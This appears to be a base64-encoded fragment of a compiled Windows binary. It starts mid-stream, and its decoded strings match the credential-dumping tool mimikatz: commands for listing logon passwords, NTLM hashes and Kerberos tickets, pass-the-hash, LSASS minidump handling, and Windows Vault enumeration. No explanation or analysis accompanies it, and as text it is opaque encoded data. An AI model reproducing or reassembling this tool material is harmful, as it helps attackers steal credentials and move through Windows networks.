B0AGUAAAAAAEQAbwBtAGEAaQBuACAAUABhAHMAcwB3AG8AcgBkAAAAYwByAGUAZAAAAAAAVwBpAG4AZABvAHcAcwAgAFYAYQB1AGwAdAAvAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABtAG8AZAB1AGwAZQAAAHYAYQB1AGwAdAAAAHYAYQB1AGwAdABjAGwAaQAAAAAAVmF1bHRFbnVtZXJhdGVJdGVtVHlwZXMAVmF1bHRFbnVtZXJhdGVWYXVsdHMAAAAAVmF1bHRPcGVuVmF1bHQAAFZhdWx0R2V0SW5mb3JtYXRpb24AVmF1bHRFbnVtZXJhdGVJdGVtcwBWYXVsdENsb3NlVmF1bHQAVmF1bHRGcmVlAAAAVmF1bHRHZXRJdGVtAAAAAAoAVgBhAHUAbAB0ACAAOgAgAAAACQBJAHQAZQBtAHMAIAAoACUAdQApAAoAAAAAAAkAIAAlADIAdQAuAAkAJQBzAAoAAAAAAAkACQBUAHkAcABlACAAIAAgACAAIAAgACAAIAAgACAAIAAgADoAIAAAAAAACQAJAEwAYQBzAHQAVwByAGkAdAB0AGUAbgAgACAAIAAgACAAOgAgAAAAAAAJAAkARgBsAGEAZwBzACAAIAAgACAAIAAgACAAIAAgACAAIAA6ACAAJQAwADgAeAAKAAAACQAJAFIAZQBzAHMAbwB1AHIAYwBlACAAIAAgACAAIAAgACAAOgAgAAAAAAAJAAkASQBkAGUAbgB0AGkAdAB5ACAAIAAgACAAIAAgACAAIAA6ACAAAAAAAAkACQBBAHUAdABoAGUAbgB0AGkAYwBhAHQAbwByACAAIAAgADoAIAAAAAAACQAJAFAAcgBvAHAAZQByAHQAeQAgACUAMgB1ACAAIAAgACAAIAA6ACAAAAAJAAkAKgBBAHUAdABoAGUAbgB0AGkAYwBhAHQAbwByACoAIAA6ACAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHYAYQB1AGwAdABfAGwAaQBzAHQAIAA7ACAAVgBhAHUAbAB0AEcAZQB0AEkAdABlAG0ANwAgADoAIAAlADAAOAB4AAAAAAAJAAkAUABhAGMAawBhAGcAZQBTAGkAZAAgACAAIAAgACAAIAA6ACAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHYAYQB1AGwAdABfAGwAaQBzAHQAIAA7ACAAVgBhAHUAbAB0AEcAZQB0AEkAdABlAG0AOAAgADoAIAAlADAAOAB4AAAAAAAKAAkACQAqACoAKgAgACUAcwAgACoAKgAqAAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdgBhAHUAbAB0AF8AbABpAHMAdAAgADsAIABWAGEAdQBsAHQARQBuAHUAbQBlAHIAYQB0AGUAVgBhAHUAbAB0AHMAIAA6ACAAMAB4ACUAMAA4AHgACgAAAAAACQAJAFUAcwBlAHIAIAAgACAAIAAgACAAIAAgACAAIAAgACAAOgAgAAAAAAAlAHMAXAAlAHMAAAAAAAAAUwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuAFwATABvAGcAbwBuAFUASQBcAFAAaQBjAHQAdQByAGUAUABhAHMAcwB3AG8AcgBkAAAAAABiAGcAUABhAHQAaAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdgBhAHUAbAB0AF8AbABpAHMAdABfAGQAZQBzAGMASQB0AGUAbQBfAFAASQBOAEwAbwBnAG8AbgBPAHIAUABpAGMAdAB1AHIAZQBQAGEAcwBzAHcAbwByAGQATwByAEIAaQBvAG0AZQB0AHIAaQBjACAAOwAgAFIAZQBnAFEAdQBlAHIAeQBWAGEAbAB1AGUARQB4ACAAMgAgADoAIAAlADAAOAB4AAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwB2AGEAdQBsAHQAXwBsAGkAcwB0AF8AZABlAHMAYwBJAHQAZQBtAF8AUABJAE4ATABvAGcAbwBuAE8AcgBQAGkAYwB0AHUAcgBlAFAAYQBzAHMAdwBvAHIAZABPAHIAQgBpAG8AbQBlAHQAcgBpAGMAIAA7ACAAUgBlAGcAUQB1AGUAcgB5AFYAYQBsAHUAZQBFAHgAIAAxACAAOgAgACUAMAA4AHgACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHYAYQB1AGwAdABfAGwAaQBzAHQAXwBkAGUAcwBjAEkAdABlAG0AXwBQAEkATgBMAG8AZwBvAG4ATwByAFAAaQBjAHQAdQByAGUAUABhAHMAcwB3AG8AcgBkAE8AcgBCAGkAbwBtAGUAdAByAGkAYwAgADsAIABSAGUAZwBPAHAAZQBuAEsAZQB5AEUAeAAgAFMASQBEACAAOgAgACUAMAA4AHgACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdgBhAHUAbAB0AF8AbABpAHMAdABfAGQAZQBzAGMASQB0AGUAbQBfAFAASQBOAEwAbwBnAG8AbgBPAHIAUABpAGMAdAB1AHIAZQBQAGEAcwBzAHcAbwByAGQATwByAEIAaQBvAG0AZQB0AHIAaQBjACAAOwAgAEMAbwBuAHYAZQByAHQAUwBpAGQAVABvAFMAdAByAGkAbgBnAFMAaQBkACAAKAAwAHgAJQAwADgAeAApAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHYAYQB1AGwAdABfAGwAaQBzAHQAXwBkAGUAcwBjAEkAdABlAG0AXwBQAEkATgBMAG8AZwBvAG4ATwByAFAAaQBjAHQAdQByAGUAUABhAHMAcwB3AG8AcgBkAE8AcgBCAGkAbwBtAGUAdAByAGkAYwAgADsAIABSAGUAZwBPAHAAZQBuAEsAZQB5AEUAeAAgAFAAaQBjAHQAdQByAGUAUABhAHMAcwB3AG8AcgBkACAAOgAgACUAMAA4AHgACgAAAAAACQAJAFAAYQBzAHMAdwBvAHIAZAAgACAAIAAgACAAIAAgACAAOgAgAAAAAAAJAAkAUABJAE4AIABDAG8AZABlACAAIAAgACAAIAAgACAAIAA6ACAAJQAwADQAaAB1AAoAAAAAAAkACQBCAGEAYwBrAGcAcgBvAHUAbgBkACAAcABhAHQAaAAgADoAIAAlAHMACgAAAAkACQBQAGkAYwB0AHUAcgBlACAAcABhAHMAcwB3AG8AcgBkACAAKABnAHIAaQBkACAAaQBzACAAMQA1ADAAKgAxADAAMAApAAoAAAAJAAkAIABbACUAdQBdACAAAAAAAHAAbwBpAG4AdAAgACAAKAB4ACAAPQAgACUAMwB1ACAAOwAgAHkAIAA9ACAAJQAzAHUAKQAAAAAAYwBsAG8AYwBrAHcAaQBzAGUAAABhAG4AdABpAGMAbABvAGMAawB3AGkAcwBlAAAAYwBpAHIAYwBsAGUAIAAoAHgAIAA9ACAAJQAzAHUAIAA7ACAAeQAgAD0AIAAlADMAdQAgADsAIAByACAAPQAgACUAMwB1ACkAIAAtACAAJQBzAAAAAAAAAGwAaQBuAGUAIAAgACAAKAB4ACAAPQAgACUAMwB1ACAAOwAgAHkAIAA9ACAAJQAzAHUAKQAgAC0APgAgACgAeAAgAD0AIAAlADMAdQAgADsAIAB5ACAAPQAgACUAMwB1ACkAAAAlAHUACgAAAAkACQBQAHIAbwBwAGUAcgB0AHkAIAAgACAAIAAgACAAIAAgADoAIAAAAAAAJQAuACoAcwBcAAAAJQAuACoAcwAAAAAAdABvAGQAbwAgAD8ACgAAAAkATgBhAG0AZQAgACAAIAAgACAAIAAgADoAIAAlAHMACgAAAHQAZQBtAHAAIAB2AGEAdQBsAHQAAAAAAAkAUABhAHQAaAAgACAAIAAgACAAIAAgADoAIAAlAHMACgAAACUAaAB1AAAAJQB1AAAAAABbAFQAeQBwAGUAIAAlAHUAXQAgAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHYAYQB1AGwAdABfAGMAcgBlAGQAIAA7ACAAawB1AGwAbABfAG0AXwBwAGEAdABjAGgAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AdgBhAHUAbAB0AF8AYwByAGUAZAAgADsAIABrAHUAbABsAF8AbQBfAHAAcgBvAGMAZQBzAHMAXwBnAGUAdABWAGUAcgB5AEIAYQBzAGkAYwBNAG8AZAB1AGwAZQBJAG4AZgBvAHIAbQBhAHQAaQBvAG4AcwBGAG8AcgBOAGEAbQBlACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHYAYQB1AGwAdABfAGMAcgBlAGQAIAA7ACAATwBwAGUAbgBQAHIAbwBjAGUAcwBzACAAKAAwAHgAJQAwADgAeAApAAoAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHYAYQB1AGwAdABfAGMAcgBlAGQAIAA7ACAAawB1AGwAbABfAG0AXwBzAGUAcgB2AGkAYwBlAF8AZwBlAHQAVQBuAGkAcQB1AGUARgBvAHIATgBhAG0AZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAPwAgACgAdAB5AHAAZQAgAD4AIABDAFIARQBEAF8AVABZAFAARQBfAE0AQQBYAEkATQBVAE0AKQAAAAAAPABOAFUATABMAD4AAAAAAAAAAABUAGEAcgBnAGUAdABOAGEAbQBlACAAOgAgACUAcwAgAC8AIAAlAHMACgBVAHMAZQByAE4AYQBtAGUAIAAgACAAOgAgACUAcwAKAEMAbwBtAG0AZQBuAHQAIAAgACAAIAA6ACAAJQBzAAoAVAB5AHAAZQAgACAAIAAgACAAIAAgADoAIAAlAHUAIAAtACAAJQBzAAoAQwByAGUAZABlAG4AdABpAGEAbAAgADoAIAAAAAoACgAAAAAAaQBuAGYAbwBzAAAATQBpAG4AZQBTAHcAZQBlAHAAZQByACAAbQBvAGQAdQBsAGUAAAAAAG0AaQBuAGUAcwB3AGUAZQBwAGUAcgAAAG0AaQBuAGUAcwB3AGUAZQBwAGUAcgAuAGUAeABlAAAAAAAAAEYAaQBlAGwAZAAgADoAIAAlAHUAIAByACAAeAAgACUAdQAgAGMACgBNAGkAbgBlAHMAIAA6ACAAJQB1AAoACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAG4AZQBzAHcAZQBlAHAAZQByAF8AaQBuAGYAbwBzACAAOwAgAE0AZQBtAG8AcgB5ACAAQwAgACgAUgAgAD0AIAAlAHUAKQAKAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAbgBlAHMAdwBlAGUAcABlAHIAXwBpAG4AZgBvAHMAIAA7ACAATQBlAG0AbwByAHkAIABSAAoAAAAAAAkAAAAlAEMAIAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG0AaQBuAGUAcwB3AGUAZQBwAGUAcgBfAGkAbgBmAG8AcwAgADsAIABCAG8AYQByAGQAIABjAG8AcAB5AAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG0AaQBuAGUAcwB3AGUAZQBwAGUAcgBfAGkAbgBmAG8AcwAgADsAIABHAGEAbQBlACAAYwBvAHAAeQAKAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAbgBlAHMAdwBlAGUAcABlAHIAXwBpAG4AZgBvAHMAIAA7ACAARwAgAGMAbwBwAHkACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAG4AZQBzAHcAZQBlAHAAZQByAF8AaQBuAGYAbwBzACAAOwAgAEcAbABvAGIAYQBsACAAYwBvAHAAeQAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAG4AZQBzAHcAZQBlAHAAZQByAF8AaQBuAGYAbwBzACAAOwAgAFMAZQBhAHIAYwBoACAAaQBzACAASwBPAAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAG4AZQBzAHcAZQBlAHAAZQByAF8AaQBuAGYAbwBzACAAOwAgAE0AaQBuAGUAcwB3AGUAZQBwAGUAcgAgAE4AVAAgAEgAZQBhAGQAZQByAHMACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAG4AZQBzAHcAZQBlAHAAZQByAF8AaQBuAGYAbwBzACAAOwAgAE0AaQBuAGUAcwB3AGUAZQBwAGUAcgAgAFAARQBCAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAbgBlAHMAdwBlAGUAcABlAHIAXwBpAG4AZgBvAHMAIAA7ACAATwBwAGUAbgBQAHIAbwBjAGUAcwBzACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAG4AZQBzAHcAZQBlAHAAZQByAF8AaQBuAGYAbwBzACAAOwAgAE4AbwAgAE0AaQBuAGUAUwB3AGUAZQBwAGUAcgAgAGkAbgAgAG0AZQBtAG8AcgB5ACEACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AbQBpAG4AZQBzAHcAZQBlAHAAZQByAF8AaQBuAGYAbwBzAF8AcABhAHIAcwBlAEYAaQBlAGwAZAAgADsAIABVAG4AYQBiAGwAZQAgAHQAbwAgAHIAZQBhAGQAIABlAGwAZQBtAGUAbgB0AHMAIABmAHIAbwBtACAAYwBvAGwAdQBtAG4AOgAgACUAdQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBtAGkAbgBlAHMAdwBlAGUAcABlAHIAXwBpAG4AZgBvAHMAXwBwAGEAcgBzAGUARgBpAGUAbABkACAAOwAgAFUAbgBhAGIAbABlACAAdABvACAAcgBlAGEAZAAgAHIAZQBmAGUAcgBlAG4AYwBlAHMAIABmAHIAbwBtACAAYwBvAGwAdQBtAG4AOgAgACUAdQAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG0AaQBuAGUAcwB3AGUAZQBwAGUAcgBfAGkAbgBmAG8AcwBfAHAAYQByAHMAZQBGAGkAZQBsAGQAIAA7ACAAVQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAYQBkACAAcgBlAGYAZQByAGUAbgBjAGUAcwAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAG0AaQBuAGUAcwB3AGUAZQBwAGUAcgBfAGkAbgBmAG8AcwBfAHAAYQByAHMAZQBGAGkAZQBsAGQAIAA7ACAAVQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAYQBkACAAZgBpAHIAcwB0ACAAZQBsAGUAbQBlAG4AdAAKAAAAbABzAGEAcwByAHYAAAAAAExzYUlDYW5jZWxOb3RpZmljYXRpb24AAExzYUlSZWdpc3Rlck5vdGlmaWNhdGlvbgAAAABiAGMAcgB5AHAAdAAAAAAAQkNyeXB0T3BlbkFsZ29yaXRobVByb3ZpZGVyAEJDcnlwdFNldFByb3BlcnR5AAAAQkNyeXB0R2V0UHJvcGVydHkAAABCQ3J5cHRHZW5lcmF0ZVN5bW1ldHJpY0tleQAAQkNyeXB0RW5jcnlwdAAAAEJDcnlwdERlY3J5cHQAAABCQ3J5cHREZXN0cm95S2V5AAAAAEJDcnlwdENsb3NlQWxnb3JpdGhtUHJvdmlkZXIAAAAAMwBEAEUAUwAAAAAAQwBoAGEAaQBuAGkAbgBnAE0AbwBkAGUAQwBCAEMAAABDAGgAYQBpAG4AaQBuAGcATQBvAGQAZQAAAAAATwBiAGoAZQBjAHQATABlAG4AZwB0AGgAAAAAAEEARQBTAAAAQwBoAGEAaQBuAGkAbgBnAE0AbwBkAGUAQwBGAEIAAABDAGEAYwBoAGUAZABVAG4AbABvAGMAawAAAAAAQwBhAGMAaABlAGQAUgBlAG0AbwB0AGUASQBuAHQAZQByAGEAYwB0AGkAdgBlAAAAQwBhAGMAaABlAGQASQBuAHQAZQByAGEAYwB0AGkAdgBlAAAAUgBlAG0AbwB0AGUASQBuAHQAZQByAGEAYwB0AGkAdgBlAAAATgBlAHcAQwByAGUAZABlAG4AdABpAGEAbABzAAAAAABOAGUAdAB3AG8AcgBrAEMAbABlAGEAcgB0AGUAeAB0AAAAAABVAG4AbABvAGMAawAAAAAAUAByAG8AeAB5AAAAUwBlAHIAdgBpAGMAZQAAAEIAYQB0AGMAaAAAAE4AZQB0AHcAbwByAGsAAABJAG4AdABlAHIAYQBjAHQAaQB2AGUAAABVAG4AawBuAG8AdwBuACAAIQAAAFUAbgBkAGUAZgBpAG4AZQBkAEwAbwBnAG8AbgBUAHkAcABlAAAAAABMAGkAcwB0ACAAQwByAGUAZABlAG4AdABpAGEAbABzACAATQBhAG4AYQBnAGUAcgAAAAAAYwByAGUAZABtAGEAbgAAAEwAaQBzAHQAIABDAGEAYwBoAGUAZAAgAE0AYQBzAHQAZQByAEsAZQB5AHMAAAAAAGQAcABhAHAAaQAAAEwAaQBzAHQAIABLAGUAcgBiAGUAcgBvAHMAIABFAG4AYwByAHkAcAB0AGkAbwBuACAASwBlAHkAcwAAAGUAawBlAHkAcwAAAEwAaQBzAHQAIABLAGUAcgBiAGUAcgBvAHMAIAB0AGkAYwBrAGUAdABzAAAAdABpAGMAawBlAHQAcwAAAFAAYQBzAHMALQB0AGgAZQAtAGgAYQBzAGgAAABwAHQAaAAAAAAAAABTAHcAaQB0AGMAaAAgACgAbwByACAAcgBlAGkAbgBpAHQAKQAgAHQAbwAgAEwAUwBBAFMAUwAgAG0AaQBuAGkAZAB1AG0AcAAgAGMAbwBuAHQAZQB4AHQAAAAAAG0AaQBuAGkAZAB1AG0AcAAAAAAAUwB3AGkAdABjAGgAIAAoAG8AcgAgAHIAZQBpAG4AaQB0ACkAIAB0AG8AIABMAFMAQQBTAFMAIABwAHIAbwBjAGUAcwBzACAAIABjAG8AbgB0AGUAeAB0AAAAAAAAAAAATABpAHMAdABzACAAYQBsAGwAIABhAHYAYQBpAGwAYQBiAGwAZQAgAHAAcgBvAHYAaQBkAGUAcgBzACAAYwByAGUAZABlAG4AdABpAGEAbABzAAAAbABvAGcAbwBuAFAAYQBzAHMAdwBvAHIAZABzAAAAAABMAGkAcwB0AHMAIABTAFMAUAAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAAAHMAcwBwAAAATABpAHMAdABzACAATABpAHYAZQBTAFMAUAAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAAAGwAaQB2AGUAcwBzAHAAAABMAGkAcwB0AHMAIABUAHMAUABrAGcAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAAAB0AHMAcABrAGcAAABMAGkAcwB0AHMAIABLAGUAcgBiAGUAcgBvAHMAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAAAAAAEwAaQBzAHQAcwAgAFcARABpAGcAZQBzAHQAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAAAB3AGQAaQBnAGUAcwB0AAAATABpAHMAdABzACAATABNACAAJgAgAE4AVABMAE0AIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAAABtAHMAdgAAAAAAAABTAG8AbQBlACAAYwBvAG0AbQBhAG4AZABzACAAdABvACAAZQBuAHUAbQBlAHIAYQB0AGUAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMALgAuAC4AAABTAGUAawB1AHIATABTAEEAIABtAG8AZAB1AGwAZQAAAHMAZQBrAHUAcgBsAHMAYQAAAAAAUwB3AGkAdABjAGgAIAB0AG8AIABQAFIATwBDAEUAUwBTAAoAAAAAAFMAdwBpAHQAYwBoACAAdABvACAATQBJAE4ASQBEAFUATQBQACAAOgAgAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AbQBpAG4AaQBkAHUAbQBwACAAOwAgADwAbQBpAG4AaQBkAHUAbQBwAGYAaQBsAGUALgBkAG0AcAA+ACAAYQByAGcAdQBtAGUAbgB0ACAAaQBzACAAbQBpAHMAcwBpAG4AZwAKAAAAAAAAAAAATwBwAGUAbgBpAG4AZwAgADoAIAAnACUAcwAnACAAZgBpAGwAZQAgAGYAbwByACAAbQBpAG4AaQBkAHUAbQBwAC4ALgAuAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAGEAYwBxAHUAaQByAGUATABTAEEAIAA7ACAATABTAEEAUwBTACAAcAByAG8AYwBlAHMAcwAgAG4AbwB0ACAAZgBvAHUAbgBkACAAKAA/ACkACgAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AYQBjAHEAdQBpAHIAZQBMAFMAQQAgADsAIABNAGkAbgBpAGQAdQBtAHAAIABwAEkAbgBmAG8AcwAtAD4ATQBhAGoAbwByAFYAZQByAHMAaQBvAG4AIAAoACUAdQApACAAIQA9ACAATQBJAE0ASQBLAEEAVABaAF8ATgBUAF8ATQBBAEoATwBSAF8AVgBFAFIAUwBJAE8ATgAgACgAJQB1ACkACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AYQBjAHEAdQBpAHIAZQBMAFMAQQAgADsAIABNAGkAbgBpAGQAdQBtAHAAIABwAEkAbgBmAG8AcwAtAD4AUAByAG8AYwBlAHMAcwBvAHIAQQByAGMAaABpAHQAZQBjAHQAdQByAGUAIAAoACUAdQApACAAIQA9ACAAUABSAE8AQwBFAFMAUwBPAFIAXwBBAFIAQwBIAEkAVABFAEMAVABVAFIARQBfAEkATgBUAEUATAAgACgAJQB1ACkACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AYQBjAHEAdQBpAHIAZQBMAFMAQQAgADsAIABNAGkAbgBpAGQAdQBtAHAAIAB3AGkAdABoAG8AdQB0ACAAUwB5AHMAdABlAG0ASQBuAGYAbwBTAHQAcgBlAGEAbQAgACgAPwApAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBhAGMAcQB1AGkAcgBlAEwAUwBBACAAOwAgAEsAZQB5ACAAaQBtAHAAbwByAHQACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBhAGMAcQB1AGkAcgBlAEwAUwBBACAAOwAgAEwAbwBnAG8AbgAgAGwAaQBzAHQACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBhAGMAcQB1AGkAcgBlAEwAUwBBACAAOwAgAE0AbwBkAHUAbABlAHMAIABpAG4AZgBvAHIAbQBhAHQAaQBvAG4AcwAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBhAGMAcQB1AGkAcgBlAEwAUwBBACAAOwAgAE0AZQBtAG8AcgB5ACAAbwBwAGUAbgBpAG4AZwAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAGEAYwBxAHUAaQByAGUATABTAEEAIAA7ACAASABhAG4AZABsAGUAIABvAG4AIABtAGUAbQBvAHIAeQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AYQBjAHEAdQBpAHIAZQBMAFMAQQAgADsAIABMAG8AYwBhAGwAIABMAFMAQQAgAGwAaQBiAHIAYQByAHkAIABmAGEAaQBsAGUAZAAKAAAAAAAJACUAcwAgADoACQAAAAAAAAAAAAoAQQB1AHQAaABlAG4AdABpAGMAYQB0AGkAbwBuACAASQBkACAAOgAgACUAdQAgADsAIAAlAHUAIAAoACUAMAA4AHgAOgAlADAAOAB4ACkACgBTAGUAcwBzAGkAbwBuACAAIAAgACAAIAAgACAAIAAgACAAIAA6ACAAJQBzACAAZgByAG8AbQAgACUAdQAKAFUAcwBlAHIAIABOAGEAbQBlACAAIAAgACAAIAAgACAAIAAgADoAIAAlAHcAWgAKAEQAbwBtAGEAaQBuACAAIAAgACAAIAAgACAAIAAgACAAIAAgADoAIAAlAHcAWgAKAFMASQBEACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgADoAIAAAAAAAcgB1AG4AAAAAAAAAdQBzAGUAcgAJADoAIAAlAHMACgBkAG8AbQBhAGkAbgAJADoAIAAlAHMACgBwAHIAbwBnAHIAYQBtAAkAOgAgACUAcwAKAAAAQQBFAFMAMQAyADgACQA6ACAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBwAHQAaAAgADsAIABBAEUAUwAxADIAOAAgAGsAZQB5ACAAbABlAG4AZwB0AGgAIABtAHUAcwB0ACAAYgBlACAAMwAyACAAKAAxADYAIABiAHkAdABlAHMAKQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBwAHQAaAAgADsAIABBAEUAUwAxADIAOAAgAGsAZQB5ACAAbwBuAGwAeQAgAHMAdQBwAHAAbwByAHQAZQBkACAAZgByAG8AbQAgAFcAaQBuAGQAbwB3AHMAIAA4AC4AMQAgACgAbwByACAANwAvADgAIAB3AGkAdABoACAAawBiADIAOAA3ADEAOQA5ADcAKQAKAAAAQQBFAFMAMgA1ADYACQA6ACAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBwAHQAaAAgADsAIABBAEUAUwAyADUANgAgAGsAZQB5ACAAbABlAG4AZwB0AGgAIABtAHUAcwB0ACAAYgBlACAANgA0ACAAKAAzADIAIABiAHkAdABlAHMAKQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBwAHQAaAAgADsAIABBAEUAUwAyADUANgAgAGsAZQB5ACAAbwBuAGwAeQAgAHMAdQBwAHAAbwByAHQAZQBkACAAZgByAG8AbQAgAFcAaQBuAGQAbwB3AHMAIAA4AC4AMQAgACgAbwByACAANwAvADgAIAB3AGkAdABoACAAawBiADIAOAA3ADEAOQA5ADcAKQAKAAAAbgB0AGwAbQAAAAAATgBUAEwATQAJADoAIAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAHAAdABoACAAOwAgAG4AdABsAG0AIABoAGEAcwBoACAAbABlAG4AZwB0AGgAIABtAHUAcwB0ACAAYgBlACAAMwAyACAAKAAxADYAIABiAHkAdABlAHMAKQAKAAAAIAAgAHwAIAAgAFAASQBEACAAIAAlAHUACgAgACAAfAAgACAAVABJAEQAIAAgACUAdQAKAAAAAAAgACAAfAAgACAATABVAEkARAAgACUAdQAgADsAIAAlAHUAIAAoACUAMAA4AHgAOgAlADAAOAB4ACkACgAAAAAAIAAgAFwAXwAgAG0AcwB2ADEAXwAwACAAIAAgAC0AIAAAAAAAIAAgAFwAXwAgAGsAZQByAGIAZQByAG8AcwAgAC0AIAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBwAHQAaAAgADsAIABHAGUAdABUAG8AawBlAG4ASQBuAGYAbwByAG0AYQB0AGkAbwBuACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBwAHQAaAAgADsAIABPAHAAZQBuAFAAcgBvAGMAZQBzAHMAVABvAGsAZQBuACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AcAB0AGgAIAA7ACAAQwByAGUAYQB0AGUAUAByAG8AYwBlAHMAcwBXAGkAdABoAEwAbwBnAG8AbgBXACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBwAHQAaAAgADsAIABNAGkAcwBzAGkAbgBnACAAYQB0ACAAbABlAGEAcwB0ACAAbwBuAGUAIABhAHIAZwB1AG0AZQBuAHQAIAA6ACAAbgB0AGwAbQAgAE8AUgAgAGEAZQBzADEAMgA4ACAATwBSACAAYQBlAHMAMgA1ADYACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAHAAdABoACAAOwAgAE0AaQBzAHMAaQBuAGcAIABhAHIAZwB1AG0AZQBuAHQAIAA6ACAAZABvAG0AYQBpAG4ACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBwAHQAaAAgADsAIABNAGkAcwBzAGkAbgBnACAAYQByAGcAdQBtAGUAbgB0ACAAOgAgAHUAcwBlAHIACgAAAAAAAAAAAAoACQAgACoAIABVAHMAZQByAG4AYQBtAGUAIAA6ACAAJQB3AFoACgAJACAAKgAgAEQAbwBtAGEAaQBuACAAIAAgADoAIAAlAHcAWgAAAAAACgAJACAAKgAgAEwATQAgACAAIAAgACAAIAAgADoAIAAAAAAACgAJACAAKgAgAE4AVABMAE0AIAAgACAAIAAgADoAIAAAAAAACgAJACAAKgAgAFMASABBADEAIAAgACAAIAAgADoAIAAAAAAAAA